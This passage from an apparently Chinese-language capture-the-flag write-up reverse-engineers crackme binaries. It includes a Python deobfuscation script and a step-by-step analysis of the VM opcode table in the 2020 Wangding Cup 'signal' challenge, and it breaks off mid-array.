v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将混淆代码提取出来放进文件里进行筛选，这里使用大佬提供的筛选代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;c.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;d.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">f1=f1.read()</span><br><span class="line">s=f1.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">s=s.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">s=s.replace(<span class="string">&quot;u&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">a=s.split(<span class="string">&quot;;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="comment">#25014</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a=a[<span class="number">0</span>:<span class="number">25013</span>]<span class="comment">#取非0的数据</span></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line">w=[]</span><br><span class="line">ss=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[::-<span class="number">1</span>]:<span class="comment">#反向取字符串</span></span><br><span class="line">  <span class="keyword">if</span> i[<span class="number">0</span>]==<span class="string">&#x27;b&#x27;</span>:<span class="comment">#开头的字符串是&#x27;b&#x27;开头的内容时，拼接到初始字符串上并添加一个换行符</span></span><br><span class="line">    ss+=i+<span class="string">&quot;\n&quot;</span></span><br><span class="line">ss=ss.replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;$&quot;</span>)<span class="comment">#取一个中间变量$将+-互换</span></span><br><span class="line">ss=ss.replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;+&quot;</span>)</span><br><span class="line">ss=ss.replace(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;-&quot;</span>)</span><br><span class="line">ss=ss.replace(<span class="string">&quot;byte_&quot;</span>,<span class="string">&quot;arr[&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">71</span>,<span class="number">1</span>):</span><br><span class="line">  ss=ss.replace(<span class="built_in">chr</span>(i),<span class="built_in">chr</span>(i+<span class="number">32</span>)) <span class="comment">#将大写换成小写，为了下面hex函数，之后替换作铺垫</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):<span class="comment">#25次使用索引值i]代替0x694100+i的值</span></span><br><span class="line">  ss=ss.replace(<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">0x694100</span>+i)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="built_in">str</span>(i)+<span class="string">&quot;]&quot;</span>)</span><br><span class="line">f2.write(ss)</span><br><span class="line"><span class="comment"># print(ss)</span></span><br></pre></td></tr></table></figure><p>筛选后的代码如图</p><p><img src="https://s2.loli.net/2022/10/12/qace8wxXILPJ1fM.png" alt="code.png"></p><p>后面直接写脚本打印flag即可</p><h3 id="signal（2020网鼎杯青龙组题目）"><a href="#signal（2020网鼎杯青龙组题目）" class="headerlink" title="signal（2020网鼎杯青龙组题目）"></a>signal（2020网鼎杯青龙组题目）</h3><p>找到main函数，定位到关键位置，发现qmemcpy函数将一个长字段复制到v4中，后面作为参数传递到定义的函数内部。并且传递了114这个数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">117</span>]; <span class="comment">// [esp+18h] [ebp-1D4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v4, &amp;unk_403040, <span class="number">0x1C8</span>u);             <span class="comment">// 操作数复制到v4</span></span><br><span class="line">  <span class="built_in">vm_operad</span>(v4, <span class="number">114</span>);                           <span class="comment">// VM函数</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good,The answer format is:flag &#123;&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而我们打开&amp;unk_403040位置发现是这样一段内容，现在我们还不知道这段数据用来做什么，所以推测后面可能使用它作为程序执行中的操作数或者操作码（VM操作码）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> unk_403040[<span class="number">128</span>] = &#123;</span><br><span class="line">    <span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, </span><br><span class="line">    <span class="number">0x00000020</span>, <span class="number">0x00000008</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, </span><br><span class="line">    <span class="number">0x0000000B</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, </span><br><span class="line">    <span class="number">0x00000003</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000021</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, </span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000020</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, </span><br><span class="line">    <span class="number">0x00000051</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000024</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, </span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000025</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, </span><br><span class="line">    <span class="number">0x00000036</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000041</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000020</span>, <span class="number">0x00000008</span>, </span><br><span class="line">    <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000025</span>, </span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000020</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, </span><br><span class="line">    <span class="number">0x00000041</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000022</span>, <span class="number">0x00000007</span>, <span class="number">0x0000003F</span>, </span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x00000034</span>, <span class="number">0x00000007</span>, <span class="number">0x00000032</span>, <span class="number">0x00000007</span>, <span class="number">0x00000072</span>, <span class="number">0x00000007</span>, <span class="number">0x00000033</span>, </span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x00000018</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFA7</span>, <span class="number">0x00000007</span>, <span class="number">0x00000031</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFF1</span>, </span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x00000028</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFF84</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFC1</span>, <span class="number">0x00000007</span>, <span class="number">0x0000001E</span>, </span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, </span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>进入vm_operad函数;</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="type">int</span> *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> enc_flag[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= a2 )                             <span class="comment">// a2 = 114</span></span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v9] )                           <span class="comment">// a1是操作数，v9决定取哪个数据</span></span><br><span class="line">    &#123;                                           <span class="comment">// a1 = 10 4 8 3 1 4 8 5 1 3 8 11 1 12 8 4 1 5 8 3 1 11 8 11 1 4 8 3 1 2 8 4 1 12 8 11 1 5 8 2 1 2 8 4 1 2 8 5 1 5 8 2 1 4 8 3 1 2 8 12 1 7 7 7 7 7 7 7 7 7 7 7 7 7 7 7</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        enc_flag[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + enc_flag[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = enc_flag[v8] - <span class="built_in">LOBYTE</span>(a1[v9 + <span class="number">1</span>]);</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ enc_flag[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * enc_flag[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:                                   <span class="comment">// case7的时候进行退出</span></span><br><span class="line">        <span class="keyword">if</span> ( enc_flag[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] ) <span class="comment">// 程序最后进行比较</span></span><br><span class="line">        &#123;                                       <span class="comment">// enc_flag = 34, 63, 52, 50, 114, 51, 24, -89, 49, -15, 40, -124, -63, 30, 122</span></span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        enc_flag[v5] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">read</span>(enc_flag);                         <span class="comment">// 输入点</span></span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = enc_flag[v8] - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = enc_flag[v8] + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析上面这段函数发现整个函数主体使用了switch..case…这样的结构，仔细观察case结构的时候发现也是不同的，case 10对应着输入点，输入长度限制为15，错误就退出。这样就意味着switch第一次执行的时候对应的a1[v9]值是10。也就对应复制的opcode的第一个数。因此基本可以判断这个程序使用了VM虚拟机技术进行加密。而这类技术使用不同的操作码对应不同的操作。</p><p>继续分析VM函数的内容，程序使用a1[v9]来决定执行怎样的操作，我们可以修改代码，使我们随意输入15个字符。然后观察每次都使用哪个操作数（a1[v9]），同时可以把在case 7最后进行比较的数据打印出来，以便于我们下一步的求flag更改的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vmopcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// [esp+dch] [ebp-1ch]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+e0h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [esp+e4h] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v8; <span class="comment">// [esp+e8h] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> v9; <span class="comment">// [esp+ech] [ebp-ch]</span></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> a1[<span class="number">114</span>] = &#123;</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0x04</span>, <span class="number">0x10</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x01</span>, <span class="number">0x0c</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x0b</span>, <span class="number">0x08</span>, <span class="number">0x0b</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x0c</span>, <span class="number">0x08</span>, <span class="number">0x0b</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x25</span>, <span class="number">0x01</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x08</span>, <span class="number">0x0c</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x22</span>, <span class="number">0x07</span>, <span class="number">0x3f</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x34</span>, <span class="number">0x07</span>, <span class="number">0x32</span>, <span class="number">0x07</span>, <span class="number">0x72</span>, <span class="number">0x07</span>, <span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x18</span>, <span class="number">0x07</span>, <span class="number">0xffffffa7</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x07</span>, <span class="number">0xfffffff1</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x28</span>, <span class="number">0x07</span>, <span class="number">0xffffff84</span>, <span class="number">0x07</span>, <span class="number">0xffffffc1</span>, <span class="number">0x07</span>, <span class="number">0x1e</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x7a</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (a1[v9])                           <span class="comment">// v9决定执行什么操作</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="comment">//printf(&quot;%d, &quot;, a1[v9 + 1]);//打印进行加密后的flag值</span></span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);                      </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>, v9);</span><br><span class="line">            <span class="comment">//printf(&quot;%d, &quot;, a1[v9]);</span></span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>, v9);</span><br><span class="line">        <span class="comment">//printf(&quot;%d, &quot;,a1[v9]);//a1每次取值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样得到的结果：</p><p>最终需要比较的结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = &#123;<span class="number">0X22</span>, <span class="number">0X3F</span>, <span class="number">0X34</span>, <span class="number">0X32</span>, <span class="number">0X72</span>, <span class="number">0X33</span>, <span class="number">0X18</span>, <span class="number">0XFFFFFFA7</span>, <span class="number">0X31</span>, <span class="number">0XFFFFFFF1</span>, <span class="number">0X28</span>, <span class="number">0XFFFFFF84</span>, <span class="number">0XFFFFFFC1</span>, <span class="number">0X1E</span>, <span class="number">0X7A</span>&#125;;</span><br></pre></td></tr></table></figure><p>v9的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order =&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">55</span>, <span 